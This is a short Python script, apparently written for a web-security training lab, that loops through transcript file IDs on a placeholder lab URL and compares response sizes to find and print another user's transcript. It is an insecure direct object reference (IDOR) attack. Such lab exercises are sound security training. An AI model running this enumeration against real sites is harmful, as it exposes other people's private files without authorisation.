import requests


def idor_scanner(base_url, baseline_length):
    print("[*] Starting automated IDOR attack...")

    # Loop through transcript numbers 1 to 20
    for file_id in range(1, 21):
        target_url = f"{base_url}{file_id}.txt"

        # Send the GET request
        response = requests.get(target_url)

        # Compare the length to find the anomaly
        if len(response.text) != baseline_length:
            print(f"[!] Anomaly detected at: {file_id}.txt")
            print(f"[+] File Size: {len(response.text)} bytes")
            print("[+] Extracting data...\n")
            print(response.text)
            break

    print("[*] Scan complete.")


# You would replace this with your actual lab URL
target = "https://YOUR-LAB-ID.web-security-academy.net/download-transcript/"
# The size of an empty transcript we want to ignore
empty_size = 114

idor_scanner(target, empty_size)